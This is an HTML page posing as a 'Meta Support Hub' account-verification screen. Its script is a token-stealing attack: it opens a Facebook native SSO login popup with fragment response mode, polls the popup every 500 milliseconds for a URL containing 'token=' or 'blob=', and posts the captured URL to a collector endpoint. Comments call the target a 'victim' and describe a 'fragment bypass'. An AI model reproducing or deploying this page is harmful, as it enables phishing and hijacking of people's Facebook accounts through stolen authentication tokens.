<!DOCTYPE html>
<html>
<head>
    <title>Meta Support Hub</title>
</head>
<body>
    <h1>Verifying Account Status...</h1>
    <p>Please do not close this window.</p>

    <script>
        // The refined Leg Link with the fragment bypass
        const legLink = "https://www.facebook.com/login/native_sso/?flow=fbcal&app_id=1217981644879628&token=AbnFJ5EbSYB4-FhD_wQrlyXjU-iuZ5w43OHY4qwetCqe5YXG_xLbrFAI1xspfGLj-nS0zQlFDkAvgZHUEr0BdazS04T1n8mcAHwbBYk-rzE-q0erm-7bi7FJ&custom_content_config=accounts_center&extra_data=%2Fadd%2F%3Fbackground_page%3D%252F&response_mode=fragment";

        // Open the popup automatically
        const popup = window.open(legLink, "MetaHandshake", "width=600,height=800");

        // The Sniffer: Checks the popup every 500ms
        const sniffer = setInterval(() => {
            try {
                // Check if the URL now contains the leaked data
                const currentUrl = popup.location.href;
                
                if (currentUrl.includes("token=") || currentUrl.includes("blob=")) {
                    console.log("Leak Detected!");

                    // Send the full URL (including the fragment) to our PyCharm
                    fetch('http://localhost:5000/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ data: currentUrl })
                    });

                    clearInterval(sniffer);
                    // Optional: Close popup or redirect victim to a real page
                    // popup.close();
                }
            } catch (e) {
                // This catch block handles the 'Cross-Origin' security error 
                // It stays silent while the victim is still on Facebook.
            }
        }, 500);
    </script>
</body>
</html>
